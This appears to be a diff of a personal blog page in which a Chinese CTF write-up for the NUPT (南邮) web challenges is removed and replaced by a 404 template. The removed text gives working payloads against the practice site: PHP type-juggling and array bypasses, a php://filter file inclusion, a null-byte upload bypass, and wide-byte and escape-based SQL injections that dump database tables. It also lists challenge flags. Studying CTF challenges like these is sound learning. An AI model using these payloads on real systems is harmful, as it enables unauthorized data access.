@@ -22,7 +22,7 @@
     <meta name="description" content="一步一个脚印">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>南邮CTF · Supersnail&#39;s advance</title>
+    <title>[404] · Supersnail&#39;s advance</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,7 +203,7 @@
 </head>
 
     
-        <body class="post-body">
+        <body class="four-zero-four-body">
     
     
 <header class="header">
@@ -211,15 +211,6 @@
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >SuperSnail&#39;s Advance</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">南邮CTF</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>SuperSnail's Advance</a>
 </header>
@@ -231,68 +222,32 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
     
     
-    <!-- 404页  -->
+    <!-- about页 -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/404-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            南邮CTF
-            <!-- 404 -->
+            [404]
+            <!-- about -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
+                Maybe you should wait for a minute!
             
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1,204</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/11/13</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -393,103 +348,8 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>查看源码<br><code>nctf{flag_admiaanaaaaaaaaaaa}</code></p>
-<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>弱类型比较<br>==和===<br>==先转化为一致的类型比较。<br>===比较类型在比较字符串<br>构造md5(‘240610708’)=md5(‘QNKCDZO’)<br>payload：<code>http://chinalover.sinaapp.com/web19?a=240610708</code></p>
-<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>burp抓包，修改login=1;<br><img src="https://i.imgur.com/HJmHJ44.png" alt=""></p>
-<h1 id="单身20年"><a href="#单身20年" class="headerlink" title="单身20年"></a>单身20年</h1><p>查看源码发现search_key.php，Burp抓包拿flag</p>
-<h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><p>常用伪造方法：</p>
-<pre><code>Client-Ip: 127.0.0.1
-X-Forwarded-For: 127.0.0.1
-Host: 127.0.0.1
-Referer: www.google.com
-</code></pre><h1 id="单身100年"><a href="#单身100年" class="headerlink" title="单身100年"></a>单身100年</h1><p>Burp抓包，发现index.php,提交查看响应头。<br><code>flag: nctf{this_is_302_redirect}</code></p>
-<h1 id="这题不是Web"><a href="#这题不是Web" class="headerlink" title="这题不是Web"></a>这题不是Web</h1><p>源码中有gif图片，猜测隐藏在二进制文件中，直接拖到Winhex中看到flag</p>
-<h1 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h1><p>密码口令zhimakaimen,查看源码发现限制最大长度10，放到Firefox Developers Tools中Edit html中，修改为11,输入zhimakaimen得到Flag;</p>
-<h1 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h1><p><code>payload: http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=240610708</code><br>or<br><code>payload: a[]=1&amp;b[]=2</code></p>
-<h1 id="x00"><a href="#x00" class="headerlink" title="\x00"></a>\x00</h1><p>@ereg处理字符串，构造nctf[]，传入数组返回NULL,NULL!==FALSE,绕过第一层，数组传入strpos，直接返回NULL，NULL!==FALSE，输出FLAG；<br><code>payload: nctf[]</code></p>
-<h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p><code>intval()</code>取整<br>MYSQL查询<br>注入参数ID<br>小数绕过</p>
-<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>提示LFI，想到文件包含，</p>
-<pre><code>include()
-require()
-include_once()
-require_once()
-</code></pre><p>将包含文件作为PHP文件解析。<br>绕过技巧:<br>php伪协议:<br>php://filter</p>
-<p>可以读取本地文件<br>index.php?file=php://filter/read=convert.base64-encode/resource=index.php<br>指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。</p>
-<p>php://phar</p>
-<p>归档，解压缩协议。<br>指定相对路径<br><code>index.php?file=phar://shell.zip/phpinfo.txt</code><br>指定绝对路径<br><code>index.php?file=phar://D:/index/www/fileinclude/shell.zip/phpinfo.txt</code></p>
-<p>payload:<code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</code></p>
-<h1 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h1><p>base64_decode解码字符串<br>字符串ascii-1转化成字符串最后输出</p>
-<p>区分eval和echo，前者将字符串当PHP代码执行，echo输出一个或多个字符串。</p>
-<p>修改eval为echo</p>
-<h1 id="单身一百年也没有用"><a href="#单身一百年也没有用" class="headerlink" title="单身一百年也没有用"></a>单身一百年也没有用</h1><p>点进去发现flag变化，BURP截包GO，响应头有Flag,考察301重定向问题。</p>
-<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>extract()将变量从数组导入当前符号表</p>
-<p>方便特性：<br>用于数组<br><code>extract()，它的主要作用是将数组展开，键名作为变量名，元素值为变量值，</code></p>
-<p>POST数值时，会进行变量覆盖，extract($_GET,EXTP_SKIP)跳过覆盖。</p>
-<p>查看source.php，构造$pass == $thepassword_123即可。利用extract()可覆盖特性。进行全局变量修改。</p>
-<p>拿flag;</p>
-<h1 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h1><p>查看提示，strcmp()返回0可输出flag；由此可想到利用strcmp漏洞,POST只能上传字符串类型，如果构造一个数组，在5.3之前php中，将return 0;虽然报错，却判定相等。</p>
-<p><code>payload:pass[]=1</code></p>
-<h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><p>basename[]返回路径中得文件名部分。<br>上传一个evil.jpg文件，抓包，发现提示<br><img src="https://i.imgur.com/Bg2sOGU.png" alt=""><br>发现不是php文件。</p>
-<p>思路：检验为php文件发现是通过basename,在/uploads/目录下。<br>由此可以构造./uploads/evil.php上传后发现变成evil.phpevil.jpg，由此可以想到利用0x00截断，构造出evil.php，绕过验证。</p>
-<h1 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h1><p>审计代码发现</p>
-<h1 id="sqlinjection3"><a href="#sqlinjection3" class="headerlink" title="sqlinjection3"></a>sqlinjection3</h1><p>宽字节注入。 利用%df%5c形成汉字。绕过\<br>爆库<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,database()%23  查出数据库为sae-chinalover，转化为16进制0x7361652d6368696e616c6f766572<br>爆表<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7361652d6368696e616c6f766572%23<br>爆列<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23<br>爆字段<br><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&#39;</a> union select 1,flag from ctf4%23</p>
-<h1 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h1><p>脑洞题。看了Writeup发现访问404.html。查看源码隐藏着flag;</p>
-<h1 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h1><p>看到URL中user1=Y3RmdXNlcg%3D%3D,进行URL解码，然后发现base64加密。解密后得到ctfuser,提示说要重置admin的密码，放到burp里修改user1=YWRtaW4%3d,将user=admin.</p>
-<h1 id="sqlinjection-4"><a href="#sqlinjection-4" class="headerlink" title="sqlinjection 4"></a>sqlinjection 4</h1><p>php中双引号会替换变量的值，而单引号会把它当做字符串输出。</p>
-<p>get_magic_quotes_gpc()里使用了stripslashes(str)，在if条件中未执行。<br>查询语句为</p>
-<p><code>$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;</code><br>因此要通过\转义符来去掉后面的’，构造<br><code>http://chinalover.sinaapp.com/web15/index.php?username=\&amp;password=or 1=1%23</code></p>
-<p>查询语句变成<br><code>SELECT * FROM users WHERE name=&#39;\&#39;AND pass=&#39;or 1=1#;&#39;</code></p>
-<h1 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h1><p>aaencode解码，然后访问1bc29b36f623ba82aaf6724fd3b16718.php,提示在头里，查看Headers，发现tip:.history of bash,搜索发现Linux 命令行历史记录在.bash_history，然后访问，发现存在zip压缩包，访问下载拿到flag;</p>
-<h1 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h1><p>提示很明显了。查看源码发现管理员邮箱，Linux下异常退出会留下b备份文件.submit.php.swp，访问之后看到token验证机制。长度等于10且等于0；想到科学记数法构造token 0e00000000;bypass之后得到flag;</p>
-<p>#</p>
+            <!-- 不可以删除，否则会调用post的layout  -->
 
-    </article>
-    <!-- license  -->
-    
-        <div class="license-wrapper">
-            <p>原文作者：<a href="http://yoursite.com">Jason_xi</a>
-            <p>原文链接：<a href="http://yoursite.com/2018/11/13/南邮/">http://yoursite.com/2018/11/13/南邮/</a>
-            <p>发表日期：<a href="http://yoursite.com/2018/11/13/南邮/">November 13th 2018, 8:20:36 pm</a>
-            <p>更新日期：<a href="http://yoursite.com/2018/11/13/南邮/">December 7th 2018, 9:35:01 pm</a>
-            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
-        </div>
-    
-    <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/11/14/网络安全复习/" title= "网络安全复习">
-                    <div class="nextTitle">网络安全复习</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/11/11/D03games/" title= "D0g3 Game Writeup">
-                    <div class="prevTitle">D0g3 Game Writeup</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
-    
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
-</main>
             <!-- profile -->
             
         </div>
@@ -581,24 +441,6 @@ require_once()
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#签到"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#md5"><span class="toc-number">2.</span> <span class="toc-text">md5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cookie"><span class="toc-number">3.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#单身20年"><span class="toc-number">4.</span> <span class="toc-text">单身20年</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#你从哪里来"><span class="toc-number">5.</span> <span class="toc-text">你从哪里来</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#单身100年"><span class="toc-number">6.</span> <span class="toc-text">单身100年</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#这题不是Web"><span class="toc-number">7.</span> <span class="toc-text">这题不是Web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#签到2"><span class="toc-number">8.</span> <span class="toc-text">签到2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bypass-again"><span class="toc-number">9.</span> <span class="toc-text">bypass again</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x00"><span class="toc-number">10.</span> <span class="toc-text">\x00</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-number">11.</span> <span class="toc-text">MYSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件包含"><span class="toc-number">12.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-decode"><span class="toc-number">13.</span> <span class="toc-text">php decode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#单身一百年也没有用"><span class="toc-number">14.</span> <span class="toc-text">单身一百年也没有用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#变量覆盖"><span class="toc-number">15.</span> <span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pass-check"><span class="toc-number">16.</span> <span class="toc-text">pass check</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件上传绕过"><span class="toc-number">17.</span> <span class="toc-text">文件上传绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#起名字真难"><span class="toc-number">18.</span> <span class="toc-text">起名字真难</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlinjection3"><span class="toc-number">19.</span> <span class="toc-text">sqlinjection3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#层层递进"><span class="toc-number">20.</span> <span class="toc-text">层层递进</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#密码重置"><span class="toc-number">21.</span> <span class="toc-text">密码重置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlinjection-4"><span class="toc-number">22.</span> <span class="toc-text">sqlinjection 4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#综合题"><span class="toc-number">23.</span> <span class="toc-text">综合题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#密码重置2"><span class="toc-number">24.</span> <span class="toc-text">密码重置2</span></a></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -2186,8 +2028,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
